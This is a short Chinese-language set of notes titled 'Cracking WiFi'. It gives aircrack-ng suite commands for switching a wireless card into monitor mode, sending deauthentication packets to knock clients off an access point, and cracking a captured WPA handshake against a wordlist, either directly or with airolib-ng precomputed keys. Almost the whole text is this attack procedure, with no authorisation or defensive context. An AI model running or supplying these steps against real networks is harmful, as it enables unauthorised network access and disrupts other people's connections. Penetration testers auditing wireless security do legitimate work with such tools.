1 Cracking WiFi

1.1 无线网卡模式切换

无线网卡默认为 Managed 模式，需要切换到 Monitor 模式

1.1.1 方式一 (airmon-ng)

airmon-ng check kill
airmon-ng                       # 列出接口
airmon-ng start wlan0

airmon-ng stop wlan0mon         # 切换回 Managed 模式

1.1.2 方式二 (ifconfig)

ifconfig wlan0 down
ifconfig wlan0 mode monitor
ifconfig wlan0 up

1.3 DEAUTHENTICATION

1.3.1 针对 AP 下的所有客户端

aireplay-ng --deauth [number of packets] -a [AP] [INTERFACE]

1.3.2 针对 AP 下的某个客户端

aireplay-ng --deauth [number of deauth packets] -a [AP] -c [target] [interface]

1.5 计算

1.5.1 原理

使用 pbkdf2 算法将字典中每一个密码与 AP 名字 (essid) 进行计算得到 Pairwise Master Key (PMK) ， 并将该 PMK 与握手文件中的值进行比较。

1.5.2 直接计算

aircrack <handshake-file> -w <wordlist>

1.5.3 使用 airolib-ng 计算

1.5.3.1 创建数据库并导入字典
airolib-ng <db-name> --import passwd <wordlist>
1.5.3.2 导入 ESSID
airolib-ng <db-name> --import essid <essid-file>
1.5.3.3 计算 PMK
airolib-ng <db-name> --batch
1.5.3.4 使用数据库中的数据进行破解
aircrack-ng -r <db-name> <handshake-file>
